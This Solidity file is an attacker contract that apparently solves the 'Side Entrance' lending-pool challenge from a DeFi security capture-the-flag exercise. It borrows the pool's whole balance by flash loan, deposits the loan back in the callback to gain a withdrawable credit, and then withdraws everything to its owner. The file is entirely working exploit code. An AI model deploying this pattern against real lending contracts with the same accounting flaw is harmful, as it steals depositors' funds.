// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "solady/src/utils/SafeTransferLib.sol";
import "solmate/src/auth/Owned.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

/**
 * @title SideEntranceLenderPoolAttacker
 * @author Igor Coser
 */
contract SideEntranceLenderPoolAttacker is Owned{
    constructor() Owned(msg.sender){ // just for good practice.
    }

    function attack(address _pool) external onlyOwner(){
        ISideEntranceLenderPool(_pool).flashLoan(address(_pool).balance);
    }

    function execute() external payable{
        ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function withdraw(address _pool) external onlyOwner{
        ISideEntranceLenderPool(_pool).withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }

    receive() external payable {}
}
